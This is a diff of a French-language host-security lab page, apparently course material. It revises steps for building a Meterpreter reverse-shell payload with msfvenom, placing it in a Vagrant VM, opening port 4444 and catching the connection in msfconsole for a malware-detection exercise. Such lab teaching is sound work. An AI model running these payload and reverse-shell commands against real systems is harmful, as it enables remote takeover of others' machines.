@@ -6736,20 +6736,18 @@ end</code></pre>
                     <img src="../images/detection_virus_2.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
 <pre><code>cd ~/Downloads</code></pre>
-<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=172.28.128.1 lport=4444 -f elf &gt; /home/galagao/shell2</code></pre>
-                    <p>En résumé, cette commande génère un malware (reverse shell) qui se connecte à ton IP.</p>
-<pre><code>chmod +x shell2</code></pre>
-<pre><code>file shell2</code></pre>
-<pre><code>cp ~/shell2 /home/galago/Sync/EPHEC/host-security/vm-provisioning/hard/scanning/</code></pre>
-                    <p>En résumé, cette commande copie le fichier généré vers un autre dossier.</p>
-                    <p>Dans la VM "scanning" ou scanning-sanitized" :</p>
-<pre><code>cd /vagrant</code></pre>
-<pre><code>cp shell2 ~</code></pre>
-<pre><code>cd ~</code></pre>
-                    <p>Sur la machine hôte, il faut que le firewall autorise les connexions entrantes sur le port 4444, utilisé par le payload pour établir la connexion avec la commande suivante :</p>
+<p>Sur la machine hôte, il faut que le firewall autorise les connexions entrantes sur le port 4444, utilisé par le payload pour établir la connexion avec la commande suivante :</p>
 <pre><code>sudo ufw allow 4444</code></pre>
                     <p>Il faut également lancer la console principale de Metasploit Framework sur la machine hôte et configurer un handler afin d'écouter la connexion entrante du reverse shell avec la commande suivante :</p>
-<pre><code>msfconsole</code></pre>
+<pre><code>msfconsole -q -x "exit" # initialise Metasploit Framework</code></pre>
+<pre><code>msfvenom -a x64 --platform linux -p linux/x86/meterpreter/reverse_tcp lhost=172.28.128.1 lport=4444 -f elf &gt; /home/galagao/shell</code></pre>
+                    <p>En résumé, cette commande génère un malware (reverse shell) qui se connecte à ton IP.</p>
+<pre><code>cp ~/shell /le-chemin-vers-directory-ayant-créé-vm</code></pre>
+                    <p>En résumé, cette commande copie le fichier généré vers un autre dossier.</p>
+                    <p>Dans la VM "scanning" ou scanning-sanitized" :</p>
+<pre><code>cp /vagrant/shell . # copie payload dans VM</code></pre>
+<pre><code>chmod +x shell # rend exécutable</code></pre>
+<pre><code>file shell</code></pre>
                     <h4>Configuration de l'écoute dans msfconsole :</h4>
                     <img src="../images/detection_virus_3.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
@@ -6764,7 +6762,7 @@ end</code></pre>
                     <h4>Exploitation du système :</h4>
                     <img src="../images/detection_virus_4.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
-<pre><code>./shell2</code></pre>
+<pre><code>./shell</code></pre>
                     <p>En résumé, cette commande lance le malware (reverse shell).</p>
 <pre><code>run</code></pre>
                     <p>En résumé, cette commande lance l'exploit / met en attente une connexion.</p>
